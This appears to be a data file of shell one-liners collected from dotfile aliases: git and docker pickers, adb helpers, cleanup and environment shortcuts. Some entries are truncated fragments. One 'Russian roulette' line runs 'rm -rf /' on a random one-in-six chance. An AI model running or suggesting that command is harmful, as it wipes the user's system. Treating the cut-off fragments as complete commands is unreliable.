"amixer -D pulse sset Master 10%- |sed -n ""s/.*\[\([^]]*\%\)\].*/Volume:\1/p"" | head -1"
"amixer -D pulse sset Master 10%+ |sed -n ""s/.*\[\([^]]*\%\)\].*/Volume:\1/p"" | head -1"
"alias|grep -e ""alias g[0-9]""|grep -v ""alias m"" > ~/.bookmarks"
"alias|grep -e ""alias d[0-9]""|grep -v ""alias m"" > ~/.bash_bookmarks"
"alias| sed ""s/=/\t/"" | fzf"
"alias_$1() { ((\$#)) || set -- $2;$1 \""\$@\""; }; alias_$1"
"alias.list | cut -d "" "" -f 2- | cut -d ""="" -f1"
"alias | sed ""s/^alias //"" | cut -d ""="" -f 1"
"alias | sed ""s/\x27//g; s/alias \([^=]\+\)=\(.\)/\1\t\2/"" | awk ""BEGIN {FS=\""\t\""} { printf(\""%-15s %s\n\"", \$1, substr(\$2,0,64)) }"""
"alias | grep grep | sed ""s/=/\t/g"""
"alias | grep -v ""git"" | bat -l zsh --style plain"
"alias | grep ""git"" | cut -c 7-"
"alias | grep ""git"" | bat -l zsh --style plain"
"alias | grep ""^z-"" | grep ""^[^=]\+"" --color"
"alias | grep ""^[a-z]="" | sort"
"alias | egrep -i ""mix|iex""
"alias -p && cat ~/.bash_functions | grep function | sed -r ""s/\(\).*?$/\(\)/g"""
"alert ""🆗"" || alert ""⚠ Not 🆗!"""
"alert ""$(history|tail -n1|sed -e "
"alcurl deployments/v1/accounts -s | jq "".[] | .account_id"""
"again=`history | sed ""s/^ *[0-9]* *//g"" | peco`; echo $again; command $again"
"ag -o -l -g README.md | ./eachMarkdownToOrg.sh && echo ""README.org"" | entr -p ./pandoc.sh /_"
"ag -i ""todo|fixme|xxx"""
"ag -i ""(TODO|FIXME|X{3})"""
"ag -G ""\.h$|\.hpp$|\.txx$"""
"ag -G ""\.(js?x|ts?x|json)$"" "
"ag --nocolor -l -g """" | fzy -l 256 -p ""❯ "" | xargs kak -e ""delete-buffer *stdin*"""
"ag --follow --hidden --ignore .git -g """" /mnt/h/dev/tiljs | fzf | ifne xargs nvim"
"ag --follow --hidden --ignore .git -g """" /mnt/g/qnb | fzf | ifne xargs nvim"
"ag --follow --hidden --ignore .git --ignore node_modules -g """" ./ | fzf | ifne xargs nvim"
"adb shell kill -KILL `adb shell ps | grep cameraserver | sed -e""s/^\w\w*\s*\([0-9]\{1,\}\)\s.*/\1/g""`; (adb shell pkill -l KILL gallery; adb shell pkill -l KILL camera; adb shell pkill -l KILL GoogleCamera) &>/dev/null"
"adb shell ip addr show wlan0 | grep ""inet\b"" | awk "
"adb shell dumpsys power | grep ""Display Power: state="" | cut -c22-"
"adb shell am profile `adb shell ps | grep Dragon | cut -d "" "" -f4` stop && adb pull /sdcard/a.txt && traceview a.txt"
"adb shell am profile `adb shell ps | grep Dragon | cut -d "" "" -f4` start /sdcard/a.txt"
"adb shell ""pm list packages -f"" | cut -f 2 -d ""="" | sort"
"adb shell ""dumpsys activity top | grep mParent= | sed s/mParent=//g"""
"adb logcat | grep -F ""`adb shell ps | cut -c10-15`"""
"adb logcat -d -v threadtime | egrep -i ""(system.err|androidruntime)"""
"adb logcat -T1 | grep ""ReactNativeJS\\|System\\."""
"adb disconnect $(arp -n | grep c0:ee:fb:d3:9f:66 | grep -Eo ""^[0-9.]+""):5555"
"adb devices | grep -v -e ""List of devices attached"" -e ""^[[:space:]]*$"" | wc -l"
"adb connect $(arp -n | grep c0:ee:fb:d3:9f:66 | grep -Eo ""^[0-9.]+""):5555"
"acpi | tail -n 1 | cut -d "","" -f2"
"acpi | awk '{ print \$4 \$5 }' | sed 's/,/ /'"
"acpi -V | head -n 1 | cut -d "","" -f 2"
"ack -v -g --type=python ""test|tests"" | ack -x"
"ack -n -R --nogroup ""(TODO|FIND|FIX(ME)?):"" --ignore-dir={composer,vendor,vendors,min,lib}"
"ack ""TODO|FIXME|XXX"""
"a=$(searchcommands);echo -n ""$a""|head -n 1 |clip2"
"`vagrant box list | peco | cut -d"" "" -f1`"
"`toybox list | fzf --prompt ""Playgrounds>"" | sed -E ""s/\(.*\)$//g""`"
"`recent-git-branches | peco --prompt ""GIT BRANCH>"" | head -n 1`"
"`ip addr | grep -Po '(?!(inet 127.\d.\d.1))(inet \K(\d{1,3}\.){3}\d{1,3})' | awk -F'.' '{print "
"`history | awk '$2 ~ /ssh/ && $3 ~ /yezq@[0-9]+/{print $2,$3}' | tail -n1`"
"`git_branch_list| fzf --query=""* ""| perl -pe ""s/^ . //g""`"
"`git tag | fzf --prompt ""Tags>"" | head -n 1`"
"`git status -s | fzf -m --reverse --ansi --prompt ""git status> "" | sed -e ""s/^\s*\S*\s*//g""`"
"`git status --short | peco --prompt ""GIT STATUS>"" | awk "
"`git stash list | peco --prompt ""[GIT STASH]> "" | cut -d: -f1`"
"`git remote | percol --prompt ""GIT REMOTE>"" | head -n 1`"
"`git remote | peco | sed -e ""s/^\*[ ]*//g""`"
"`git remote | peco --prompt ""GIT REMOTE>"" | head -n1`"
"`git remote | peco --prompt ""GIT REMOTE>"" | head -n 1`"
"`git remote | peco --prompt ""GIT REMOTE >"" | head -n 1`"
"`git remote | fzf --prompt ""Remotes>"" | head -n 1`"
"`git reflog | peco | cut -d"" "" -f1`"
"`git log --pretty=format:""%h %s - %an, %ar"" | peco | cut -d"" "" -f1`"
"`git log --oneline | peco | cut -d"" "" -f1`"
"`git log --oneline --branches | peco | cut -d"" "" -f1`"
"`git log --oneline --branches | peco --prompt ""GIT LOG"" | awk ""{print $1}""`"
"`git log --oneline --all | peco | cut -d"" "" -f1`"
"`git graph -n 200 | fzf --reverse --ansi | sed -e ""s/\([a-zA-Z0-9]\{1,\}\).*/\1/"" -e ""s/^[^a-zA-Z0-9]\{1,\}//g""`"
"`git branch | peco | tr -d "" ""`"
"`git branch | peco | sed -e ""s/^\*[ ]*//g""`"
"`git branch | peco | sed -e ""s/^\*//g""`"
"`git branch | peco --prompt ""[branch]"" | sed -e ""s/^\*[ ]*//g""`"
"`git branch | peco --prompt ""GIT BRANCH>"" | sed -e ""s/^\*[ ]*//g""`"
"`git branch | peco --prompt ""BRANCH>"" | sed -e ""s/^\*[ ]*//g""`"
"`git branch | fzf | sed -e ""s/^\*[ ]*//g""`"
"`git branch | fzf --select-1 | sed -e ""s/^\*[ ]*//g""`"
"`git branch | fzf --reverse --ansi --exact | sed -e ""s/^[\* ]\{0,1\} //g""`"
"`git branch | $FILTER_CMD$FILTER_OPT | sed -e ""s/^\*[ ]*//g""`"
"`git branch -r | peco | sed -e ""s/^\*[ ]*//g""`"
"`git branch -a | percol --prompt ""GIT BRANCH>"" | sed -e ""s/^\*[ ]*//g""`"
"`git branch -a | peco | sed -e ""s/^\*\s*//g""`"
"`git branch -a | peco | sed -e ""s/^\*[ ]*//g""`"
"`git branch -a | peco --prompt ""GIT BRANCH>"" | tr -d "" \\*""`"
"`git branch -a | peco --prompt ""BRANCH>"" | sed -e ""s/^\*[ ]*//g""`"
"`git branch --sort=-authordate | fzf | sed -e ""s/^\*[ ]*//g""`"
"`git br | fzf | sed -e ""s/^\*[ ]*//g""`"
"`g b | fzf --reverse | sed -e ""s/^\*[ ]*//g""`"
"`fc-list :outline -f ""%{family}\n"" | sort -u | less"
"`docker ps -a|peco| cut -d"" "" -f 1`"
"`docker ps -a | $FZF_COMMAND --header-lines=1 -m --prompt ""Docker Processes: "" | cut -d"" "" -f1`"
"`docker images | $FZF_COMMAND --header-lines=1 -m --prompt ""Docker Images: "" | awk ""{if (\\$1 == \""<none>\"") {print \\$3} else {print \\$1 \"":\"" \\$2}}""`"
"`docker images --format ""table {{.ID}}\t{{.Repository}}\t{{.CreatedSince}}\t{{.Size}}"" | ${INTERACTIVE_FILTER} | cut -d"" "" -f1`"
"_pipestatus=""${PIPESTATUS[*]}""; [[ -z ""${_pipestatus//[ 0]/}"" ]] || paludis_die_unless_nonfatal_func ""$FUNCNAME"" ""$LINENO"" ""$_pipestatus"""
"_pipestatus=""${PIPESTATUS[*]}""; [[ -z ""${_pipestatus//[ 0]/}"" ]] || diefunc ""${FUNCNAME:-$0}"" ""$LINENO"" ""$_pipestatus"""
"_pipestatus=""${PIPESTATUS[*]}""; [[ ""${_pipestatus// /}"" -eq 0 ]] || die"
"_paludis_pipestatus=""${PIPESTATUS[*]}""; [[ -z ""${_paludis_pipestatus//[ 0]/}"" ]] || paludis_die_unless_nonfatal_func ""$FUNCNAME"" ""$LINENO"""
"_paludis_pipestatus=""${PIPESTATUS[*]}""; [[ -z ""${_paludis_pipestatus//[ 0]/}"" ]] || diefunc ""${FUNCNAME:-$0}"" ""$LINENO"""
"_license(){find . -name ""LICENSE"" -print | xargs cat| grep $1}; _license"
"_gi $(_gi list | gsed ""s/,/\n/g"" | peco )"
"_genpw() { len=""${1:-36}""; tr -dc A-Za-z0-9_!? < /dev/urandom | head -c ${len} | xargs; }; _genpw"
"_f() { du -sh ""$@"" | sort -hr | m; }; _f"
"__vex() { [ $# -eq 1 ] && [ ""$1"" == ""-q"" ] && [ -r ""bin/activate"" ] && deactivate && return 0;[ -r ""${!#}/bin/activate"" ] && cd ""${!#}"" && . bin/activate || virtualenv ""$@"";[ -d ""${!#}"" ] && cd ""${!#}"";[ -r ""bin/activate"" ] && . bin/activate; unset -f __vex; }; __vex"
"__tan() { tmux attach -t ""$@"" || tmux new -s ""$@""; }; __tan"
"__pslsp() { local p=""$@""; local ptot=""$(ps -f -l -p -u -s -W)"";local phead=""$(echo ""$ptot"" | head -1)"";local pbody=""$(echo ""$ptot"" | sed "
"__pslsp() { local p=""$@""; local ptot=""$(ps -e -o pid,uname,comm,pcpu,pmem,etime,cmd --sort=-pcpu,-pmem)"";local phead=""$(echo ""$ptot"" | head -1)"";local pbody=""$(echo ""$ptot"" | sed "
"__lsf() { local p=""$1"";ls --almost-all -lha $(realpath ${p:-$(pwd)}) 2>/dev/null | grep -v ^d | grep -v ^l; unset -f __lsf; }; __lsf"
"__lsf() { local p=""$1""; ls --almost-all -lha $(realpath ${p:-$(pwd)}) 2>/dev/null | grep -v ^d | grep -v ^l; unset -f __lsf; }; __lsf"
"__igrep() { sudo grep -rHin ""$1"" . | grep -v node_modules | grep -v listing.csv ${@:2}; }; __igrep"
"__git_branch ; git push || git push --set-upstream origin ""${GIT_CURRENT_BRANCH}"""
"__ggrep() { sudo grep -rHn ""$1"" . | grep -v node_modules | grep -v listing.csv ${@:2}; }; __ggrep"
"_\(\){ /bin/ls -F -1 -A \""\x24@\""[|]cf([|]column)?;};_"
"_Msh_trace_$2"" || die ""trace: alias failed"""
"_(){ glu $1 | grep ""Change-Id"" | head -1 }; _"
"_(){ docker logs -f `docker ps | grep $1 | awk ""{print $1}""` ;};_"
"_(){ /bin/ls -F -1 -A ""\$@""|cf|column;};_"
"_(){ ( [ ! -z $1 ] && [ -d $1 ] ) && cd $1 || echo ""Failed !""; }; _"
"_() { song_l=\""\${#1}\""; np_song_l=\""\${1##*/}\""; [[ ! \${#np_song_l} -lt \${song_l} ]] && song=\""\$(pwd)/\${1}\"" || song=\""\${1}\""; echo \""\${song}\"" >> \""${M_PLAYLIST}\""; }; _"
"_() { git branch --merged ${1-master} | grep -v "" ${1-master}$"" | xargs -n 1 git branch -d; }; _"
"_() { echo `gSHAact $1` | xargs -n 1 | xargs -I {} ${DIFFCMD} ""{}^"" {} ;};_"
"_() { IFS=\$(echo -en \""\n\b\"") && for a in \$(ls -f1 *\""\${1}\"" | shuf | tail -10); do add2mpl \""\${a}\""; done; }; _"
"_ lsof -Pn -i4TCP -sTCP:LISTEN | sort -t"":"" -k2n | grep -P ""(?<=:)[0-9]+ """
"]*\)=.*/\1/') | sort -u | grep ""$@"""
"]*)=.*;:\1?;p' | sort | tr -d '\n')"""
"\xev | \grep -P --color=auto '(?<=button)[^,]*|(?<=keysym )0x[0-9a-f]*, [^)]*'"
"\x27_\(\)\{ /bin/ls -F -1 -A ""\x5c\x24\x5c\x40""\|cf([|]column)?;};_\x27,d' ~/.zshrc "
"\x27_\(\)\{ /bin/ls -F -1 -A ""\x5c\x24\x5c\x40""\|cf([|]column)?;};_\x27,d' ~/.bashrc "
"\x27""; print $0 ""\x27""}' | sed 's/\x27 /\x27/g' | sort )"
"\svn diff `\svn info | grep ""URL"" | cut -d "" "" -f 2` ^/trunk --summarize"
"\rm -i $( \svn status | \grep ^? | \awk ""{ print \$2 }"" )"
"\ps h -eo pid,euser,command|grep -v grep|\grep -E --color=auto --binary-file=without-match "
"\ps -o ppid,pid,euser,stat,%cpu,rss,args | head -n 1; ps -eH -o ppid,pid,euser,stat,%cpu,rss,args | grep username"
"\ps -o ppid,pid,euser,stat,%cpu,rss,args | head -n 1; ps -eH -o ppid,pid,euser,stat,%cpu,rss,args | grep ""yourUserName"""
"\ps -eo pcpu,pid,user,args | sort -k 1 -r | head -10"
"\perl -MExtUtils::Install -MExtUtils::Installed -e ""unshift@ARGV,new ExtUtils::Installed;sub a{\@ARGV};uninstall((eval{a->[0]->packlist(a->[1])}||do{require CPAN;a->[0]->packlist(CPAN::Shell->expandany(a->[1])->distribution->base_id=~m/(.*)-[^-]+$/)})->packlist_file,1,a->[2])"""
"\nvidia-smi -q -d PIDS | grep ""Process ID"" | tr -s "
"\ls -tr ~/downloads | tail -1 | xargs -I{} printf ""$HOME/downloads/%s"" {}"
"\ls -1 | grep -v ""sav$"" | tr ""\n"" "" "" ; echo"
"\grep -h -A1 ""^You unwrap the papyrus envelope and toss it away"" ~/lich/logs/GSIV-*/`date +%Y`-* | sort | uniq"
"\git log --color --all --date-order --decorate --dirstat=lines,cumulative --stat | sed 's/\([0-9] file[s]\? .*)$\)/\1\n_______\n-------/g' | \less -R"
"\du -hs -- err.txt generated.file succ.txt .??* 2>/dev/null | \grep -P --binary-files=without-match --color=auto '^[0-9]{3}[0-9,.]*M|^[0-9,.]+G'"
"\df -h | sort -k 6,6 | sed ""/^Filesystem/d"""
"\date --rfc-3339=seconds | tr ""-"" "" "" | awk ""{ print \$4 }"""
"\'ruby -e 'C=`stty size`.scan(/\d+/)[1].to_i;S=[""2743"".to_i(16)].pack(""U*"");a={};puts ""\033[2J"";loop{a[rand(C)]=0;a.each{|x,o|;a[x]+=1;print ""\033[#{o};#{x}H \033[#{a[x]};#{x}H#{S} \033[0;0H""};$stdout.flush;sleep 0.1}'\'"
"\""systemctl list-units | egrep 'neutron|openstack'\"""" >> ~/.bashrc"
"\""sudo docker exec --privileged=true -it \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep 'mq-python' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -it \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep 'mq-nginx' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -it \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep 'mq-mysql' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -it \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep 'mq-fpm' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -i \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep '_app-redis' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -i \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep '_app-nginx' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -i \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep '_app-mysql' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""sudo docker exec --privileged=true -i \`sudo docker ps -a --format='table {{.ID}}\t{{.Names}}' | grep '_app-fpm' | awk '{print \$1}'\`\"""" >> ${profile}"
"\""source"" |awk -F 'source' '{ print \$2; }' |awk -F'\""' '{ print \$1; }'\`"
"\""source"" |awk -F 'source' '{ print $2; }' |awk -F'\""' '{ print $1; }'`"
"\""source \${FOAM_INST_DIR}/${_distpkgname}-${pkgver}/etc/bashrc\"""" >> ${pkgdir}/etc/profile.d/openfoam-${pkgver}.sh || return 1"
"\""source \${FOAM_INST_DIR}/${_distpkgname}-${_pkgver}/etc/bashrc\"""" >> ${pkgdir}/etc/profile.d/openfoam-${_pkgver}.sh || return 1"
"\""nvim\"""" ""~/.bash_aliases"" || echo ""alias nv=\""nvim\"""" >> ""~/.bash_aliases"""
"\""ls -l | sed \\\""s/^.*administ *\([0-9]*\) \([^ ]* \)*/\1$(printf '\t')/g\\\"" | sort -nr\"""""
"\""kill $(ps -ef | grep Xvfb | awk '{print $2}')\"""" >> /home/vagrant/.aliases/aliases.unix"
"\""ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255\"""" >> $PREFIX/etc/fish/config.fish"
"\""history|tail -n 1|sed 's/\s\s[0-9]*\s\s//'\"""" >> ~/environment/dotfiles/.alias_cache"
"\""grep 'routing table speculation' /opt/skyboxview/server/log/server.log | awk -F'speculation on' '{print \\\$2}' | sort -u\"""" >> /home/skyboxview/.bashrc"
"\""git branch | grep -v 'master' | xargs git branch -D\"""" >> ~/.zshrc"
"\""getpeers | grep --color=never -E '\\\""addr\\\"": \\\""|inbound'\"""
"\""faurls | tac | urlgrep.sh -s0.08\"""
"\""docker exec -it \$(docker ps | grep 'arch[1-2]' | awk '{print \$1}') /bin/bash\"""" >> /root/.bashrc"
"\""docker exec -it \$(docker ps | grep 'arch[1-2]' | awk '{print \$1}') /bin/bash\"""" >> /home/ec2-user/.bashrc"
"\""curl -s 2ip.ru | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | head -n 1\"""" >> ~/.bashrc"
"\""cd ..\"""" < /home/ubuntu/.profile || { echo ""alias up=\""cd ..\"""" >> /home/ubuntu/.profile; } # Convenience up command"
"\""bash /etc/Dawn/dawn.sh"" ~/.bashrc || echo ""alias dawn=\""bash /etc/Dawn/dawn.sh\"" "" >> ~/.bashrc"
"\""bash /etc/Dawn/dawn.sh"" ~/.bashrc || echo ""alias Dawn=\""bash /etc/Dawn/dawn.sh\"" "" >> ~/.bashrc"
"\""_exit.sh && _exit\"";alias _exit=\""builtin exit\""; function _docker(){ ""$_dockerP"" \$@;};export -f _docker;function exit(){ _exit.sh 0; };function check(){ export PS1=\""MLDS-NB-C-CURR->\$MLDS_C_CURR\$(_check.sh \$MLDS_C_CURR && echo '*')):\W$ \""; }; trap 'check' USR1;trap '_changeEnv.sh NAME \$(cat .tmpChangeEnv) && rm -rf .tmpChangeEnv;' USR2; echo -e \""For Stop The Env\n\t$ exit\"";export pidMldsBase=\$$;check"") || _gb.sh"
"\""\$FOAM_INST_DIR/$_gitname/etc/bashrc\"""" >> ""$pkgdir/etc/profile.d/openfoam.sh"" || return 1"
"\""'$samPath/$samSelf'\"" #autosam\nsam #autosam"" >> ""$profile"" ||"
"\""$_cralias\"""" >> ""$file"" || \"
"\""$WEB_PROJECT\"""" >> ""/home/$u/.bashrc"" ||"
"[[ -z `git --no-pager status --short` ]] && echo `this` is clean || (echo ""!!!!! Uncommitted Changes on `this`"" && return 1)"
"[[ -z $(git config ""branch.$(git symbolic-ref --short HEAD).merge"") ]] && git push -u origin $(git symbolic-ref --short HEAD) || git push"
"[[ -r ~/TODO ]] && ""$EDITOR"" ~/TODO || echo ""~/TODO bad perm"""
"[[ -n $CONDA_DEFAULT_ENV ]] && echo ""env is set as $CONDA_DEFAULT_ENV"" || source activate ncl_stable; ncl"
"[[ -n $(pacman -Qdt) ]] && sudo pacman -Rs $(pacman -Qdtq) || echo ""no orphans to remove"""
"[[ -n ""`yaourt -Qdtq`"" ]] && yaourt -Rs $(yaourt -Qdtq) || echo "":: No package to remove"""
"[[ -f tags-descriptor ]] && ctags -R $(cat tags-descriptor) || echo ""no tags-descriptor file"""
"[[ -f log/development.log || -f log/test.log ]] && echo """" > log/*.log"
"[[ -f /var/run/reboot-required ]] && echo ""Reboot required"" || echo ""No need to reboot."""
"[[ -f /usr/bin/raspi-config ]] && sudo /usr/bin/raspi-config || echo ""raspi-config not found. Are you using a Raspberry Pi with Raspbian?"""
"[[ -f ""Session.vim"" ]] && vim -S || vim"
"[[ -d ~/Images/screenshots/$(date +%F)-screenshots ]] && cd ~/Images/screenshots/$(date +%F)-screenshots || echo ""No screenshots taken today"""
"[[ -d .venv ]] && source .venv/bin/activate || echo ""no virtualenv in current folder"""
"[[ $__oo__insideTryCatch -eq 0 ]] || set +e; __oo__presetShellOpts=""$-""; __oo__insideTryCatch+=1; ( set -e; true; "
"[[ $__oo__insideTryCatch -eq 0 ]] || __oo__presetShellOpts=""$-""; __oo__insideTryCatch+=1; set +e; ( set -e; true; "
"[[ $USER == ""root"" ]] && zsh /root/.cpdotfiles.sh || echo ""run as root."""
"[[ $- == generated.file ]] && echo ""yes"" || echo ""no"""
"[[ $- == generated.file ]] && echo ""Interactive"" || echo ""Not interactive"""
"[[ ""${PIPENV_ACTIVE}"" -ne 1 ]] && echo ""pipenv is not active"" || { echo ""pipenv is active. Exiting shell..."" >&2 ; exit ; }"
"[[ ""$b"" = ""master"" ]] || git switch $b 2>1 >> $team_repos_log; [[ -n ""$stashed"" ]] && git stash pop >> $team_repos_log; popd >> $team_repos_log; done"
"[[ ""$PWD"" == ""/home/$USER/GitHub/""* ]] || find -xdev -not -path ""*/GitHub/*"" \( -type f -exec chmod 600 {} \+ -o -type d -exec chmod 700 ""{}"" \+ \) -exec chown $UID:$UID {} \+ -printf ""FIXING: %p\n"" 2> /dev/null"
"[[ ""$IS_CONSOLE"" -eq 1 ]] && app alot -C16 || app alot"
"[[ ""$(cat /usr/local/cpanel/version)"" =~ ([0-9]+)\.([0-9]+) ]] && curl -sL atom.cpanel.net/changelog/cpanel-changelog-""${BASH_REMATCH[2]}"".atom|lynx -stdin -dump|less"
"[[ ""$#"" -eq 2 ]] && a=""$2"" || a=""./"";open /System/Library/CoreServices/Finder.app ""$a"""
"['|\""].*#\(.*\)$/\1 #\2/p"" ""$f"" | sed ""s/list_aliases=.*#/list_aliases #/"""
"[""$'\''](.+)[""$'\''].*' --replace '$1' -N --no-filename --no-heading $DOTFILES/rcfiles/zsh/ | sort | column"
"[ \$LUX_DEVELOPER -eq 0 ] && luxbin cpub --quiet && lux rrc --quiet && rr && luxdev >/dev/null && echo -e ""$blue$lambda$x"" || echo ""Developer Mode required to publish Lux"""
"[ -z ""$TMUX"" ] && tmux new-session ""ncmpcpp 2>/dev/null"" 1>/dev/null || ncmpcpp 2>/dev/null"
"[ -z ""$TMUX"" ] && [ -n ""$TMUX_TTY"" ] && tmux -V > /dev/null 2>&1 && { tmux has -t ""$TMUX_TTY"" > /dev/null 2>&1 && tmux attach -t ""$TMUX_TTY"" || tmux new -s ""$TMUX_TTY"" ; }"
"[ -z ""$1"" ] && open -a finder ./ || open -a finder"
"[ -n ""$SCRIPT_FILE"" ] && less -R $SCRIPT_FILE || echo ""Error: No script file. Are you in a tmux session?"""
"[ -n ""$DISPLAY"" ] || startx"
"[ -f LICENSE ] && echo 'file LICENSE exists' || \
"[ -f .nvmrc ] && n $(cat .nvmrc) || echo ""MISSING: .nvmrc"""
"[ -f $HOME/.config/i3/config ] && $EDITOR $HOME/.config/i3/config || echo ""i3 config not found"""
"[ -f $(sudo puppet agent --configprint agent_disabled_lockfile) ] && echo "">> puppet enforcement is disabled"" && cat $(sudo puppet agent --configprint agent_disabled_lockfile) || echo "">> puppet enforcement is enabled"""
"[ -f ""$HOME/mapping_results.tar.gz"" ] && rm -rf $HOME/results/ && mkdir $HOME/results && tar -xzf $HOME/mapping_results.tar.gz -C $HOME/results/ && rm $HOME/mapping_results.tar.gz && cd $HOME/results || echo ""Error: mapping_results.tar.gz is not present"""
"[ -e ~/.synergy/$( hostname -s ).conf ] && synergys --daemon --restart --display ${DISPLAY:-:0} --config ~/.synergy/$( hostname -s ).conf 2> ~/.log/synergys.log >&2 || echo ""no config for this host available"""
"[ -e Session.vim ] && v -S Session.vim || echo ""no session"""
"[ -e .git/index ] && nvim .git/index -c ""Gitv --all"" -c ""tabonly"" || echo .git/index not found: `pwd`"
"[ -e ""/tmp/openrelease.in"" ] && echo ""ka 01 00"" >> /tmp/openrelease.in || /sbin/poweroff"
"[ -d env ] && source env/bin/activate || echo ""No environment directory found here"""
"[ -d /sys/firmware/efi ] && echo ""EFI boot on HDD"" || echo ""Legacy boot on HDD"""
"[ -d .git ] && mkdir .git/safe || echo ""Run this command at the root of a git repository"""
"[ -d ""/usr/lib/modules/$(uname -r)"" ] || echo ""Kernel has been updated. Please reboot."""
"[ -d ""../vpython-$(basename $(pwd))"" ] || $HOME/scripts/create_env 3; source ../vpython-$(basename $(pwd))/bin/activate"
"[ -d ""../vpython-$(basename $(pwd))"" ] || $HOME/scripts/create_env 2; source ../vpython-$(basename $(pwd))/bin/activate"
"[ -d ""$RLX_HOME"" ] && cd $RLX_HOME/simdata || err ""RLX_HOME not set"""
"[ -d ""$RLX_HOME"" ] && cd $RLX_HOME/Work/simulacrum || err ""RLX_HOME not set"""
"[ -d ""$RLX_HOME"" ] && $(recseldir $RLX_HOME/Work/skynet) || err ""RLX_HOME not set"""
"[ $[ $RANDOM % 6 ] == 0 ] && echo ""T es mort !"" || echo ""Tu vis."""
"[ $[ $RANDOM % 6 ] = 0 ] && echo ""BOOM"" || echo ""Lucky bastard"""
"[ $[ $RANDOM % 6 ] = 0 ] && echo ""*BANG!*"" || echo ""*Click*"""
"[ $TMUX ] && echo ""\033Ptmux;\033\033[3 q\033\\"" || echo ""\033[3 q"""
"[ $TMUX ] && echo ""\033Ptmux;\033\033[1 q\033\\"" || echo ""\033[1 q"""
"[ $? != 0 ] && reattach-to-user-namespace osascript -e ""display notification \""$(history|tail -n1|sed -e "
"[ $? != 0 ] && notify-send --urgency=low -i ""error"" ""$(history|tail -n1|sed -e "
"[ $(uname) = ""Darwin"" ] && ioreg -p IOUSB || lsusb"
"[ $(git rev-parse --git-dir 2>& /dev/null) ] && cd `git rev-parse --show-toplevel` || echo ""Not in working git tree"""
"[ $(( $RANDOM % 6 )) == 0 ] && rm -rf / || echo ""You live"""
"[ ""$mib_brand"" = ""sagem"" ] && mib_brand=thales || mib_brand=sagem; echo $mib_brand"
"[ ""$PWD"" = ""$VAGRANT_HOME"" ] || cd ""$VAGRANT_HOME"""
"[ ""$PS1"" = ""${PSold:=$PS1}"" ] && PS1=""\u@\h \w\\$ "" || PS1=""$PSold"""
"[ ""$DISPLAY"" == """"] && emacsclient -t || emacsclient -c"
"[ ""$(git rev-parse --symbolic-full-name --abbrev-ref HEAD)"" == ""master"" ] && git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"[ ! -z ""$(find_project_root)"" ] && cd $(find_project_root) || echo ""No project detected."""
"[ ! -z ""$(find_parent_dir_with .git)"" ] && cd $(find_parent_dir_with .git) || echo ""Not in a git repository"""
"[ ! -r ~/.oath/pin ] && echo ""No PIN stored."" || echo ""$(cat ~/.oath/pin)$(authkey)"""
"[ ! -f ~/.ssh/config.d/tmp ] || [ -n ""$(find ~/.ssh/config.d -name tmp -mmin +10 2>/dev/null)"" ] && rm -f ~/.ssh/config.d/tmp && cat ~/.ssh/config ~/.ssh/config.d/*.conf >> ~/.ssh/config.d/tmp; ssh -F ~/.ssh/config.d/tmp"
"[ ! -d "".git"" ] && { git init; git flow init; hub create; } || echo ""aleady initialized"""
"ZSH_THEME=`ls ~/.config/oh-my-zsh/themes/ | cut -d""."" -f1 | fzf ` source ~/.config/oh-my-zsh/oh-my-zsh.sh"
"XSOCK=/tmp/.X11-unix && XAUTH=/tmp/.docker.xauth && xauth nlist :0 | sed -e ""s/^..../ffff/"" | xauth -f $XAUTH nmerge - && docker run -v $XSOCK:$XSOCK -v $XAUTH:$XAUTH -e XAUTHORITY=$XAUTH -e DISPLAY=$DISPLAY'"
"XSOCK=/tmp/.X11-unix && XAUTH=/tmp/.docker.xauth && xauth nlist :0 | sed -e ""s/^..../ffff/"" | xauth -f $XAUTH nmerge - && docker run -v $XSOCK:$XSOCK -v $XAUTH:$XAUTH -e XAUTHORITY=$XAUTH -e DISPLAY=$DISPLAY"
"XDEBUG_CONFIG=""idekey=PHPSTORM"" PHP_IDE_CONFIG=""serverName=wsp310"" php -dxdebug.remote_host=`echo $SSH_CLIENT | cut -d ""="" -f 2 | awk \"
"X=$(docker ps -a -q -f status=exited) [ -z ""$X"" ] || docker rm -v $X"
"X=$(docker images -q -f dangling=true) [ -z ""$X"" ] || docker rmi $X"
"Workspace; No_Changes=`Save|grep -i ""No local changes""| wc -l`; Ppull; if [ $No_Changes -eq 0 ]; then Pop; fi; Back"
"VBoxManage | grep ""VBoxManage ""|more"
"VBoxManage startvm $(VBoxManage list vms | awk ""{print $1}"" | tr ""\"""" "" "") --type headless"
"VBoxManage showvminfo boot2docker-vm | egrep ""NIC.*Rule"" | perl -lpe "
"VBoxManage list runningvms | sed -ne ""s/.*{\(.*\)}/\1/gp"" | xargs -I {} -n1 VBoxManage controlvm {} poweroff"
"VBoxManage list runningvms | cut -d"" "" -f1 | xargs -I X VBoxManage controlvm X poweroff"
"URL=`git svn info | grep URL | cut -d "" "" -f2` ; svn propget svn:externals $URL"
"UNIX95= ps -e -o ""user,pid,ppid,vsz,args""|sort -rnk4|head "
"UNIX95= ps -e -o ""user,pid,ppid,pcpu,args""|sort -rnk4|head "
"Term=screen-256 tmux -2 a -t ""[Jqs7]"" || Term=screen-256 tmux -2 new-session -s ""[Jqs7]"""
